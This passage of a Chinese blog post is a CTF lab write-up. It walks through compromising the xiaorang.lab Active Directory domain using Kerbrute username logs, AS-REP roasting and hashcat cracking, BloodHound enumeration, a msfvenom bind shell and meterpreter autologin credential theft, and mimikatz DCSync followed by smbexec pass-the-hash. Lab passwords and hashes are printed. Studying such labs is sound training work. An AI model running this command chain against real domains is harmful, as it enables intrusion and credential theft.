USERNAME:       dongcheng@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       lianhuangchen@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       lili@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       rangsibo@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       huabi@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       haoguang@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       wohua@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       wenshao@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       langying@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       diaocai@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       lianggui@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       manxue@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       baqin@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       louyou@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       chengqiu@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       maqun@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       wenbiao@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       chuyuan@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       weishengshan@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       wenliang@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       yulvxue@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       ganjian@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       luyue@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       guohong@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       pangzhen@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       lezhong@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       sheweiyue@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       dujian@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       lidongjin@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       hongqun@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       yexing@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       maoda@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       qiaomei@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       zhangxin@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       ganjian@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       weixian@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       shuzhen@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       wengbang@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       xiqidi@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       yuanchang@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       gaiyong@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       xuanjiang@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       lvhui@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       wenbo@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       zhenjun@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       jinqing@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       yangju@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       weicheng@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       weixian@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       jingze@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       haobei@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       zhaoxiu@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       jizhen@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       rubao@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       liangliang@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       tangshun@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       chouqian@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       qiyue@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       jicheng@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       xiyi@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       beijin@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       chenghui@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       chebin@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       pengyuan@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       yanglang@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       jihuan@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       duanmuxiao@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       hongzhi@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       gaijin@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       fusong@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       yifu@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       luwan@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       tangrong@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       zhufeng@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       dongcheng@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       lili@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       lianhuangchen@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       huabi@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       rangsibo@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       wohua@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       haoguang@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       wenshao@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       langying@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       diaocai@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       lianggui@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       manxue@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       baqin@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       weishengshan@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       wenbiao@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       louyou@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       maqun@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       chuyuan@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       wenliang@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       chengqiu@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       yulvxue@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       ganjian@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       luyue@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       guohong@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       dujian@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       pangzhen@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       sheweiyue@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       lezhong@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       hongqun@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       lidongjin@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       yexing@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       qiaomei@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       maoda@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       zhangxin@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       ganjian@xiaorang.lab</span><br></pre></td></tr></table></figure>
+
+<p>然后进行AS_REP Roasting攻击</p>
+<blockquote>
+<p>AS_REP Roasting是一种对用户账户进行离线爆破的方式</p>
+<p>需要关闭预身份验证，而此选项又是默认开启的，所以有一定的限制</p>
+<p>默认开启的预身份验证是会记录密码错误次数来防止爆破的</p>
+<p>关闭预身份验证后，在进行AS_REQ之后的时候，KDC不会进行任何验证就将TGT和用该用户Hash加密的Login Session Key返回</p>
+<p>由于AS_REP的数据包中Login Session Key的是由用户Hash进行加密的</p>
+<p>因此，可以对获取到的用户Hash加密的Login Session Key进行离线爆破，得到对应用户的明文密码</p>
+</blockquote>
+<p>因为当前主机不在域内，所以使用<a target="_blank" rel="noopener" href="https://github.com/fortra/impacket">impacket</a>的GetNPUsers.py进行攻击</p>
+<p>将刚才获得的用户放进字典</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 GetNPUsers.py  -dc-ip 172.22.6.12 -usersfile GetNPUser.txt  -format hashcat xiaorang.lab/ &gt; result/NPU.txt</span><br></pre></td></tr></table></figure>
+
+<p>得到用户<code>wenshao</code>和<code>zhangxin</code>的hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$krb5asrep$23$zhangxin@XIAORANG.LAB:36c9d9a10f92e0b48643660c1e3bc6a9$3ab9996ef66ea9ae9d4d2daef65ad539ff59df7277af7fcaf9e1d5b650ccd1c75a6d0007863e54ed9525c140e1337529cf99c81332155643cdd4f8c5c78c0c0252d460fd382f7adc5cdab648857076552d6f362b4b2b5b25f7df2955efdcc5870f8199255bd1f227652a31c5613ff2408183a497f9a11117b77929057d3f06033b7ab20a1d42033c083cde35eff0c39641046f9f927402b643416c3e2aca71edc7d016256b1385d54176a8dba1ac9bb4f8816ea370db8a3d0319762c435d0c4cbac30ca5dc1a6a0f0731054a8ab7c808c94613f931aba553f99aef8a044d50aacd621d79fbdb2ee8800ddff4</span><br><span class="line"></span><br><span class="line">$krb5asrep$23$wenshao@XIAORANG.LAB:2b89ef7bf03e832196f6c91d0ea3e27b$d6992ffaa3fb9bc3427d0659be92ee407cad1c231b222235d20cadccd55c2d6cceabf4032deaa3995d42df7771cb7436fe0573756cec56706ca4c889ff054027100361a7f3e3c4229bc1bdc01e111676919a7d1a2170bce258de1c5aee318c3a9c1404312a5b0b21c1e9f3ee893161b0b9e6341c9390713b836b61edda5dd2ee7f4aa4643d768430eec63d4ab389cb5adf0a8628b58b7ec0f69729b43d0bb6f978d956710d4f6cb006888473fec5149f1ec39b33bfbfae0f878fc2d2eed4e9fd810225f1e2d737b885464715210ec22d077fd53fbd1baf770158ddb65a147d90a35b073595cf2c37b9a4d4c8</span><br></pre></td></tr></table></figure>
+
+<p>然后用hashcat进行爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat  -a 0 -m 18200  1.txt  rockyou.txt  -o 2.txt </span><br></pre></td></tr></table></figure>
+
+<p>得到明文密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wenshao@XIAORANG.LAB:hellokitty</span><br><span class="line">zhangxin@XIAORANG.LAB:strawberry</span><br></pre></td></tr></table></figure>
+
+<p>用这个账户登录域内主机<code>172.22.6.25</code></p>
+<h2 id="用Bloodhound进行域信息收集"><a href="#用Bloodhound进行域信息收集" class="headerlink" title="用Bloodhound进行域信息收集"></a>用Bloodhound进行域信息收集</h2><p>然后使用Sharphound来收集域信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sharphound.exe --CollectionMethods ALL --Domain XIAORANG.LAB --ExcludeDCs</span><br></pre></td></tr></table></figure>
+
+<p>然后使用<a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/BloodHound">Bloodhound</a>来分析域环境</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo neo4j console </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./BloodHound --no-sandbox</span><br></pre></td></tr></table></figure>
+
+<p>然后将压缩包导入，进行分析</p>
+<p>点击分析，找到<code>Find Shortest Paths to Domain Admins</code>，就是最短到域管理员的路径</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304131932752.png" title="image-20230413193240642" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304131932752.png" alt="image-20230413193240642"></a></p>
+<p>当前机器为<code>WIN2019.XIAORANG.LAB</code>，所以下一个目标就是<code>YUXUAN@XIAORANG.LAB</code></p>
+<h2 id="通过自动登录注册表来抓取明文密码"><a href="#通过自动登录注册表来抓取明文密码" class="headerlink" title="通过自动登录注册表来抓取明文密码"></a>通过自动登录注册表来抓取明文密码</h2><p>HasSession</p>
+<blockquote>
+<p>当用户向计算机进行身份验证时，他们通常会将凭据暴露在系统上，这些凭据可以通过 LSASS 注入、令牌操纵或盗窃或注入用户进程来检索。</p>
+<p>任何作为系统管理员的用户都能够从内存中检索凭证材料（如果它仍然存在）</p>
+</blockquote>
+<p>这里的用户特权不够，所以不能进行令牌窃取</p>
+<p>这里也无法使用mimikatz来获取hash，因为没有管理员权限</p>
+<p>这里是使用msf来抓取自动登录密码，可能这个YUNXUAN会设置自动登录，所以可以进行抓取密码【我也不知道原理是啥】</p>
+<p>先生成一个正向shell，上传上去</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o bind_shell.exe</span><br></pre></td></tr></table></figure>
+
+<p>上线meterpreter后使用<code>windows/gather/credentials/windows_autologin</code>来抓取凭据</p>
+<blockquote>
+<p>当用户开启Windows自动登录功能时，系统会将登录凭证信息存储在注册表中，而这些凭证信息包括用户的用户名和密码。攻击者可以通过访问系统注册表来获取这些凭证信息，从而实现获取用户账户的访问权限。</p>
+<p>具体来说，攻击者需要获取目标系统上的管理员权限，然后使用注册表编辑器（Registry Editor）访问以下路径：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon。在这个路径下，攻击者可以找到如下键值：</p>
+<ol>
+<li>DefaultUserName：这个键值保存了自动登录的用户名。</li>
+<li>DefaultPassword：这个键值保存了自动登录的密码（以明文形式存储）。</li>
+</ol>
+<p>利用Metasploit框架中提供的特殊权限或技术手段来绕过这些限制，并在没有管理员权限的情况下获取这些预设凭据【但是我没有搜到具体的实现过程】</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run windows/gather/credentials/windows_autologin</span><br></pre></td></tr></table></figure>
+
+<p>得到明文密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[+] AutoAdminLogon=1, DefaultDomain=xiaorang.lab, DefaultUser=yuxuan, DefaultPassword=Yuxuan7QbrgZ3L</span><br></pre></td></tr></table></figure>
+
+<p>然后登录这个用户，还是在<code>172.22.6.25</code>主机上</p>
+<p>查看这个用户的信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user yuxuan /domain</span><br></pre></td></tr></table></figure>
+
+<p>发现在域管理员组里</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304132146298.png" title="image-20230413214613231" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304132146298.png" alt="image-20230413214613231"></a></p>
+<h2 id="DCSync抓取Hash"><a href="#DCSync抓取Hash" class="headerlink" title="DCSync抓取Hash"></a>DCSync抓取Hash</h2><p>可以使用DCSync攻击来获取hash</p>
+<p>使用mimikatz获取hash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:xiaorang.lab /user:administrator </span><br></pre></td></tr></table></figure>
+
+<p>获取了administrator的HTLM hash:<code>04d93ffd6f5f6e4490e0de23f240a5e9</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304132222871.png" title="image-20230413222255809" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304132222871.png" alt="image-20230413222255809"></a></p>
+<h2 id="Hash传递获得管理员权限"><a href="#Hash传递获得管理员权限" class="headerlink" title="Hash传递获得管理员权限"></a>Hash传递获得管理员权限</h2><p>因为没有本地的管理员权限，所以使用impacket进行pth来横向移动到域控</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains python smbexec.py -hashes :04d93ffd6f5f6e4490e0de23f240a5e9 xiaorang.lab/administrator@172.22.6.12</span><br><span class="line"><span class="comment"># python smbexec.py -hashes LM Hash:NLTM Hash domain/username@ip</span></span><br><span class="line"><span class="comment">#-hashs，知道用户完整的哈希值，如果LM hash被废弃，就指定为0或空</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304132228583.png" title="image-20230413222828538" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304132228583.png" alt="image-20230413222828538"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304132237309.png" title="image-20230413223711273" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304132237309.png" alt="image-20230413223711273"></a></p>
+<h3 id="flag3和flag4"><a href="#flag3和flag4" class="headerlink" title="flag3和flag4"></a>flag3和flag4</h3><p>获得flag04: <code>flag&#123;1564cc85-6c3c-47ba-ab0d-1cca0d82b60b&#125;</code></p>
+<p>擦，用同样的方式获得WIN2019的administrator用户权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python smbexec.py -hashes :04d93ffd6f5f6e4490e0de23f240a5e9 xiaorang.lab/administrator@172.22.6.25</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304132236637.png" title="image-20230413223649596" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304132236637.png" alt="image-20230413223649596"></a></p>
+<p>获得flag03: <code>flag&#123;47a4480c-9cef-47c4-b11d-961aaf1c4d6c&#125;</code></p>
+</div><script src="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+    </div>
+
+    <div class="post-meta">
+        <i>
+        
+            <span>2024-03-01</span>
+            
+                <span>该篇文章被 John Doe</span>
+            
+            
+                <span>打上标签:
+                    
+                    
+                        <a href='/tags/Neo4j/'>
+                            Neo4j
+                        </a>
+                    
+                        <a href='/tags/Kerberos/'>
+                            Kerberos
+                        </a>
+                    
+                        <a href='/tags/Privilege-Elevation/'>
+                            Privilege Elevation
+                        </a>
+                    
+                        <a href='/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/'>
+                            域渗透
+                        </a>
+                    
+                </span>
+             
+             
+                <span>归为分类:
+                    
+                    
+                        <a href='/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/'>
+                            春秋云镜
+                        </a>
+                    
+                </span>
+            
+        
+        </i>
+    </div>
+    <br>
+    
+    <!-- <div class="post-footer-pre-next">
+        <span>上一篇：<a href=""></a></span>
+        <span class="post-footer-pre-next-last-span-right">上一篇：<a href=""></a></span>
+    </div> -->
+
+    
+        
+    <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+         
+    </div>
+    
+        
+
+    <div id="waline"></div>
+    <script type="module"  >
+        import { init } from 'https://npm.elemecdn.com/hexo-theme-a4@latest/source/js/waline.mjs'; 
+        function loadWaline() {
+            init({
+                el: '#waline',
+                serverURL: 'https://a4-talk.vercel.app',
+                lang: 'zh-CN',
+                dark: 'body[class~="dark-mode"]',
+                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
+                search: false, // 禁止表情包搜索
+                reaction: false, // 对文章打分
+                pageview: false, // 浏览量统计
+                comment: false, // 评论数统计
+
+                locale: {
+                    placeholder: '欢迎评论', 
+                    sofa: ''
+                },
+            });
+            
+        }
+        window.addEventListener('DOMContentLoaded', loadWaline);
+    </script>
+
+
+
+    
+    
+    
+    </div>
+
+
+     
+</div>
+
+
+
+                                      
+                    
+                    
+                    <div class="footer">
+    
+        <span> 
+            © 1949-2024 China 
+
+            
+                
+
+            
+        </span>
+    
+</div>
+<!--这是指一条线往下的内容-->
+<div class="footer-last">
+    
+            <span>🌊面朝大海，春暖花开🌸</span>
+            
+                <span class="footer-last-span-right"><i>本站由<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>驱动｜使用<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>主题</i></span>
+            
+    
+</div>
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
+
+    <!--目录-->
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
+        
+<script src="/js/toc.js"></script>
+
+    
+
+    
+<script src="/js/randomHeaderContent.js"></script>
+
+    <!--回到顶部按钮-->
+    
+        
+<script src="/js/returnToTop.js"></script>
+
+    
+
+    
+        
+<script src="/js/returnToLastPage.js"></script>
+
+    
+
+
+
+
+
+<script src="/js/lightgallery.min.js"></script>
+
+
+
+                </div>
+            
+            
+                <!-- 回到顶部的按钮-->  
+                <div class="progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+            
+                <!-- 返回的按钮-->  
+                <div class="return-to-last-progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+    </body>
+
+
+    <!--暗黑模式-->
+    <script src="/js/darkmode-js.min.js"></script>
+    <script>
+        function addDarkmodeWidget() {
+        const options = {
+            bottom: '53px', // default: '32px'
+            right: 'unset', // default: '32px'
+            left: '42px', // default: 'unset'
+            time: '0.3s', // default: '0.3s'
+            mixColor: '#fff', // default: '#fff'
+            backgroundColor: ' #e4e4e4  ',  // default: '#fff'
+            buttonColorDark: '#100f2c',  // default: '#100f2c'
+            buttonColorLight: '#fff', // default: '#fff'
+            saveInCookies: true, // default: true,
+            label: '🌓', // default: ''
+            autoMatchOsTheme: true // default: true
+        }
+    
+        const darkmode = new Darkmode(options);
+        darkmode.showWidget();
+        
+        }
+        window.addEventListener('load', addDarkmodeWidget);
+    </script>
+  
+</html>
